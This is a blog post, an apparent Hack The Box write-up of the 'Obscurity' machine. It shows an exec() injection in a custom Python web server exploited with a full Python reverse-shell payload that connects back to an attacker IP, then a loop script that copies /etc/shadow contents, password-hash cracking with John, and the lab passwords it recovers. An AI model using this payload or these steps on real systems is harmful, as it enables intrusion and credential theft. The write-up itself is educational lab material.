<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>üì¶ HTB - Obscurity - 0xNinja - My blog</title><meta name=Description content="My personnal blog"><meta property="og:title" content="üì¶ HTB - Obscurity"><meta property="og:description" content="Obscurity is my first medium box so I was very happy when I got that root.txt :D
TL;DR Custom Python web server, get source code, get revserse shell, crack user password for custom encryption system, use john to privesc.
Footholds To make things easier, I added the box to my /etc/hosts.
Recon Let&rsquo;s start with nmap to discover the open ports :
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 > nmap -A obscurity."><meta property="og:type" content="article"><meta property="og:url" content="https://0xninja.fr/htb-obscurity/"><meta property="og:image" content="https://0xninja.fr/htb-obscurity/featured-image.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-04-12T16:00:00+00:00"><meta property="article:modified_time" content="2020-04-12T16:00:00+00:00"><meta property="og:site_name" content="My cool site"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://0xninja.fr/htb-obscurity/featured-image.png"><meta name=twitter:title content="üì¶ HTB - Obscurity"><meta name=twitter:description content="Obscurity is my first medium box so I was very happy when I got that root.txt :D
TL;DR Custom Python web server, get source code, get revserse shell, crack user password for custom encryption system, use john to privesc.
Footholds To make things easier, I added the box to my /etc/hosts.
Recon Let&rsquo;s start with nmap to discover the open ports :
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 > nmap -A obscurity."><meta name=application-name content="0xNinja.fr"><meta name=apple-mobile-web-app-title content="0xNinja.fr"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://0xninja.fr/htb-obscurity/><link rel=prev href=https://0xninja.fr/setup-your-database-with-docker/><link rel=next href=https://0xninja.fr/htb-magic/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"üì¶ HTB - Obscurity","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/0xninja.fr\/htb-obscurity\/"},"image":[{"@type":"ImageObject","url":"https:\/\/0xninja.fr\/htb-obscurity\/featured-image.png","width":986,"height":285}],"genre":"posts","keywords":"htb, writeup","wordcount":1031,"url":"https:\/\/0xninja.fr\/htb-obscurity\/","datePublished":"2020-04-12T16:00:00+00:00","dateModified":"2020-04-12T16:00:00+00:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"0xNinja","logo":"https:\/\/0xninja.fr\/images\/avatar.png"},"author":{"@type":"Person","name":"0xNinja"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="0xNinja - My blog"><span class=header-title-pre>ü•∑</span><span id=id-1 class=typeit></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>üìù Posts </a><a class=menu-item href=/tags/>üè∑Ô∏è Tags </a><a class=menu-item href=/categories/>üìö Categories </a><a class=menu-item href=/projects/>üî¨ Projects </a><a class=menu-item href=/about/>ü•∑ About </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="0xNinja - My blog"><span class=header-title-pre>ü•∑</span><span id=id-2 class=typeit></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>üìùPosts</a><a class=menu-item href=/tags/ title>üè∑Ô∏èTags</a><a class=menu-item href=/categories/ title>üìöCategories</a><a class=menu-item href=/projects/ title>üî¨Projects</a><a class=menu-item href=/about/ title>ü•∑About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">üì¶ HTB - Obscurity</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://0xninja.fr title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>0xNinja</a></span>&nbsp;<span class=post-category>included in <a href=/categories/htb/><i class="far fa-folder fa-fw" aria-hidden=true></i>HTB</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2020-04-12>2020-04-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;1031 words&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;5 minutes&nbsp;</div></div><div class=featured-image><img class=lazyload src=/svg/loading.min.svg data-src=/htb-obscurity/featured-image.png data-srcset="/htb-obscurity/featured-image.png, /htb-obscurity/featured-image.png 1.5x, /htb-obscurity/featured-image.png 2x" data-sizes=auto alt=/htb-obscurity/featured-image.png title=/htb-obscurity/featured-image.png></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#tldr>TL;DR</a></li><li><a href=#footholds>Footholds</a><ul><li><a href=#recon>Recon</a></li><li><a href=#web-server>Web server</a></li><li><a href=#finding-source-code>Finding source code</a></li><li><a href=#source-code-auditing>Source code auditing</a></li><li><a href=#reverse-shell>Reverse shell</a></li></ul></li><li><a href=#user>User</a></li><li><a href=#root>Root</a></li></ul></nav></div></div><div class=content id=content><blockquote><p>Obscurity is my first medium box so I was very happy when I got that <code>root.txt</code> :D</p></blockquote><h2 id=tldr>TL;DR</h2><p>Custom Python web server, get source code, get revserse shell, crack user password for custom encryption system, use john to privesc.</p><h2 id=footholds>Footholds</h2><p>To make things easier, I added the box to my <code>/etc/hosts</code>.</p><h3 id=recon>Recon</h3><p>Let&rsquo;s start with nmap to discover the open ports :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&gt; nmap -A obscurity.htb -o nmap.out
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap scan report for obscurity.htb (10.10.10.168)
</span></span><span class=line><span class=cl>    Host is up (0.026s latency).
</span></span><span class=line><span class=cl>    Not shown: 996 filtered ports
</span></span><span class=line><span class=cl>    PORT     STATE  SERVICE    VERSION
</span></span><span class=line><span class=cl>    22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span></span><span class=line><span class=cl>    | ssh-hostkey: 
</span></span><span class=line><span class=cl>    |   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
</span></span><span class=line><span class=cl>    |   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
</span></span><span class=line><span class=cl>    |_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
</span></span><span class=line><span class=cl>    80/tcp   closed http
</span></span><span class=line><span class=cl>    8080/tcp open   http-proxy BadHTTPServer
</span></span><span class=line><span class=cl>    | fingerprint-strings: 
</span></span><span class=line><span class=cl>    |   GetRequest, HTTPOptions: 
</span></span><span class=line><span class=cl>    |     HTTP/1.1 200 OK
</span></span><span class=line><span class=cl>    |     Date: Fri, 10 Apr 2020 11:14:28
</span></span><span class=line><span class=cl>    |     Server: BadHTTPServer
</span></span><span class=line><span class=cl>    |     ...
</span></span><span class=line><span class=cl>    |_http-server-header: BadHTTPServer
</span></span><span class=line><span class=cl>    |_http-title: 0bscura
</span></span><span class=line><span class=cl>    ...
</span></span></code></pre></td></tr></table></div></div><p>So we got so far SSH and HTTP server running on the machine.</p><h3 id=web-server>Web server</h3><p>On the port 8080 we can see the web server which indicates that it is hand-made with custom code.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=homepage.png data-srcset="homepage.png, homepage.png 1.5x, homepage.png 2x" data-sizes=auto alt=homepage.png title="0bscura homepage"></p><blockquote><p>If you use custom code, you can&rsquo;t have CVE&rsquo;s on it. So your code is 100% secure.</p></blockquote><p><img class=lazyload src=/svg/loading.min.svg data-src=https://media.giphy.com/media/d3mlE7uhX8KFgEmY/giphy.gif data-srcset="https://media.giphy.com/media/d3mlE7uhX8KFgEmY/giphy.gif, https://media.giphy.com/media/d3mlE7uhX8KFgEmY/giphy.gif 1.5x, https://media.giphy.com/media/d3mlE7uhX8KFgEmY/giphy.gif 2x" data-sizes=auto alt=https://media.giphy.com/media/d3mlE7uhX8KFgEmY/giphy.gif title="Smart move gif"></p><p>By reading the content of their homepage, we get a good hint : they are hosting the source code on the server. We have to find <code>SuperSecureServer.py</code> ont it !</p><p><img class=lazyload src=/svg/loading.min.svg data-src=devmessage.png data-srcset="devmessage.png, devmessage.png 1.5x, devmessage.png 2x" data-sizes=auto alt=devmessage.png title="0bscura devteam"></p><h3 id=finding-source-code>Finding source code</h3><p>The easiest way I found on the moment was to fire up Burpsuite and use a directory wordlist.</p><p>By making a first request to the webserver, I sent it to Burp&rsquo;s intruder in sniper mode. Using a simple directory wordlist (<code>common.txt</code>) I placed the payload&rsquo;s position as <code>GET /¬ßa¬ß/SuperSecureServer.py</code>, launched the attack and waited for burp to get a 200 response code.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=intruder.png data-srcset="intruder.png, intruder.png 1.5x, intruder.png 2x" data-sizes=auto alt=intruder.png title="Burp intruder"></p><p><img class=lazyload src=/svg/loading.min.svg data-src=payload.png data-srcset="payload.png, payload.png 1.5x, payload.png 2x" data-sizes=auto alt=payload.png title="Burp payload"></p><p>The source code is at <code>/develop/SuperSecureServer.py</code> !</p><p><img class=lazyload src=/svg/loading.min.svg data-src=result.png data-srcset="result.png, result.png 1.5x, result.png 2x" data-sizes=auto alt=result.png title="Burp result"></p><h3 id=source-code-auditing>Source code auditing</h3><p>By reading the code, I found that during the document serving process, the <code>exec()</code> function is called.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>serveDoc</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>path</span><span class=p>,</span> <span class=n>docRoot</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>path</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>unquote</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>info</span> <span class=o>=</span> <span class=s2>&#34;output = &#39;Document: </span><span class=si>{}</span><span class=s2>&#39;&#34;</span> <span class=c1># Keep the output for later debug</span>
</span></span><span class=line><span class=cl>        <span class=n>exec</span><span class=p>(</span><span class=n>info</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>path</span><span class=p>))</span> <span class=c1># This is how you do string formatting, right? &lt;-- here</span>
</span></span><span class=line><span class=cl>        <span class=n>cwd</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>dirname</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>realpath</span><span class=p>(</span><span class=vm>__file__</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>docRoot</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>cwd</span><span class=p>,</span> <span class=n>docRoot</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>path</span> <span class=o>==</span> <span class=s2>&#34;/&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>path</span> <span class=o>=</span> <span class=s2>&#34;/index.html&#34;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=reverse-shell>Reverse shell</h3><p>After understanding when the exec was called, I injected a python reverse shell payload. Basically this is a command injection through format string, string which got evaluated right after. The payload we could manipulate was directly the path we GET on the server. My final payload for the reverse shell was :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /&#39;;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;IP&gt;&#34;,&lt;PORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;
</span></span></code></pre></td></tr></table></div></div><p>This payload works because :</p><ul><li>The first <code>'</code> is used to break the string generated by the format string</li><li>Both <code>;</code> to inject a new python code between</li><li>The last <code>'</code> is to make an empty string with the single quote from the source code, otherwise an error is raised</li></ul><p>So I just launched a netcat connexion listenning on my machine, and made a request on the server with the payload to get the shell.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://media.giphy.com/media/Ls6ahtmYHU760/giphy.gif data-srcset="https://media.giphy.com/media/Ls6ahtmYHU760/giphy.gif, https://media.giphy.com/media/Ls6ahtmYHU760/giphy.gif 1.5x, https://media.giphy.com/media/Ls6ahtmYHU760/giphy.gif 2x" data-sizes=auto alt=https://media.giphy.com/media/Ls6ahtmYHU760/giphy.gif title="Hapyp GIF"></p><h2 id=user>User</h2><p>The reverse shell we have is as <code>www-data</code>, we need to privesc as a regular user.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>&gt; ls /home
</span></span><span class=line><span class=cl>robert
</span></span></code></pre></td></tr></table></div></div><p>We know that user <code>robert</code> must be the user we need to privesc as. We need to investigate it&rsquo;s home directory.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>&gt; ls /home/robert
</span></span><span class=line><span class=cl>BetterSSH   check.txt   out.txt passwordreminder.txt    SuperSecureCrypt.py ...
</span></span></code></pre></td></tr></table></div></div><p>We got a bunch of files here, some are pretty interesting, especially the Python script.</p><p>By examining it, we understand that Robert uses a custom password manager, stores it&rsquo;s &ldquo;encrypted&rdquo; password in a file, and tested it&rsquo;s encryption passphrase on a dummy text file.</p><p>First thing I did was to BF it&rsquo;s password using the famous rockyou. But it was unsuccessfull, I managed to get something close to it&rsquo;s password, but not the actual password.</p><p>After thinking about the encryption and decryption algorithms, I managed to get the real password.</p><p>To use the Python script : <code>python SuperSecureCrypt.py -i infile -k key -o outfile</code> will &ldquo;encypt&rdquo; the content of infile with key into outfile. To decrypt we have to use the <code>-d</code> option.</p><p>As the encryption and decryption where very simple :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>encrypt</span><span class=p>(</span><span class=n>text</span><span class=p>,</span> <span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>newChr</span> <span class=o>=</span> <span class=nb>chr</span><span class=p>(</span> <span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>x</span><span class=p>)</span> <span class=o>+</span> <span class=nb>ord</span><span class=p>(</span><span class=n>keyChr</span><span class=p>))</span> <span class=o>%</span> <span class=mi>255</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>encrypted</span> <span class=o>+=</span> <span class=n>newCrh</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>text</span><span class=p>,</span> <span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>newChr</span> <span class=o>=</span> <span class=nb>chr</span><span class=p>(</span> <span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>x</span><span class=p>)</span> <span class=o>-</span> <span class=nb>ord</span><span class=p>(</span><span class=n>keyChr</span><span class=p>))</span> <span class=o>%</span> <span class=mi>255</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>decrypted</span> <span class=o>+=</span> <span class=n>newChr</span>
</span></span></code></pre></td></tr></table></div></div><p>The easiest way to get the password was : <code>python SuperSecureCrypt.py -d -i out.txt -k "$(cat check.txt)" -o pass.txt</code></p><p>The encryption password was <code>alexandrovich</code>.</p><p><code>python SuperSecureCrypt.py -d -i passwordreminder.txt -k alexandrovich -o robert.txt</code></p><p>Robert&rsquo;s password was <code>SecThruObsFTW</code>, we can SSH as him and get the <code>user.txt</code> content.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://media.giphy.com/media/hXDrTueJWAscK3xWQ2/giphy.gif data-srcset="https://media.giphy.com/media/hXDrTueJWAscK3xWQ2/giphy.gif, https://media.giphy.com/media/hXDrTueJWAscK3xWQ2/giphy.gif 1.5x, https://media.giphy.com/media/hXDrTueJWAscK3xWQ2/giphy.gif 2x" data-sizes=auto alt=https://media.giphy.com/media/hXDrTueJWAscK3xWQ2/giphy.gif title="Yes GIF"></p><h2 id=root>Root</h2><p>We now need to go root. As robert :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&gt; sudo -l
</span></span><span class=line><span class=cl>User robert may run the following commands on obscure:
</span></span><span class=line><span class=cl>(ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
</span></span></code></pre></td></tr></table></div></div><p>So yeah, we know where to start. We now need to know how to exploit this BetterSSH.py script.</p><p>By reading the first lines, we know that it reads the <code>/etc/shadow</code> file, and write it&rsquo;s content into a file somewhere in <code>/tmp/SSH/</code>. The script prompts for a username and password, if the password&rsquo;s hash does corresponds to the shadow one, it gives a shell as this user.</p><p>I started to find a fancy way to monitor the content of the <code>/tmp/SSH/</code> folder, but a simple bash script can do anything :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=k>while</span> true<span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl>    cat /tmp/SSH/* &gt;&gt; /tmp/.ninja
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span></code></pre></td></tr></table></div></div><p>I launched the script in background, launched the BetterSSH script too, and read the content of my <code>/tmp/.ninja</code> file. We get most of the users&rsquo; hashes separated by line, but only one matters to us. Root&rsquo;s hash was <code>$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1</code>.</p><p>Using john the ripper on the hash, we get root&rsquo;s password : <code>mercedes</code>. I could have SSH back as root, but there is already a tool for us : <code>sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</code>, entered <code>root</code> for user, and <code>mercedes</code> for password, we now have a shell as root.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://media.giphy.com/media/YJ5OlVLZ2QNl6/giphy.gif data-srcset="https://media.giphy.com/media/YJ5OlVLZ2QNl6/giphy.gif, https://media.giphy.com/media/YJ5OlVLZ2QNl6/giphy.gif 1.5x, https://media.giphy.com/media/YJ5OlVLZ2QNl6/giphy.gif 2x" data-sizes=auto alt=https://media.giphy.com/media/YJ5OlVLZ2QNl6/giphy.gif title="Happy GIF 2"></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/htb-obscurity/rooted.png data-srcset="/htb-obscurity/rooted.png, /htb-obscurity/rooted.png 1.5x, /htb-obscurity/rooted.png 2x" data-sizes=auto alt=/htb-obscurity/rooted.png title=Rooted width=697 height=486></p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2020-04-12</span></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/htb-obscurity/index.md target=_blank>Read Markdown</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Twitter" data-sharer=twitter data-url=https://0xninja.fr/htb-obscurity/ data-title="üì¶ HTB - Obscurity" data-via=0x_Ninja data-hashtags=htb,writeup><i class="fab fa-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Facebook" data-sharer=facebook data-url=https://0xninja.fr/htb-obscurity/ data-hashtag=htb><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Linkedin" data-sharer=linkedin data-url=https://0xninja.fr/htb-obscurity/><i class="fab fa-linkedin fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Reddit" data-sharer=reddit data-url=https://0xninja.fr/htb-obscurity/><i class="fab fa-reddit fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/htb/>htb</a>,&nbsp;<a href=/tags/writeup/>writeup</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/setup-your-database-with-docker/ class=prev rel=prev title="Setup your database with Docker"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>Setup your database with Docker</a>
<a href=/htb-magic/ class=next rel=next title="üì¶ HTB - Magic">üì¶ HTB - Magic<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.105.0">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2019 - 2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=https://0xninja.fr target=_blank>0xNinja</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/twemoji@14.0.2/dist/twemoji.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},data:{"id-1":"0xNinja","id-2":"0xNinja"},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results 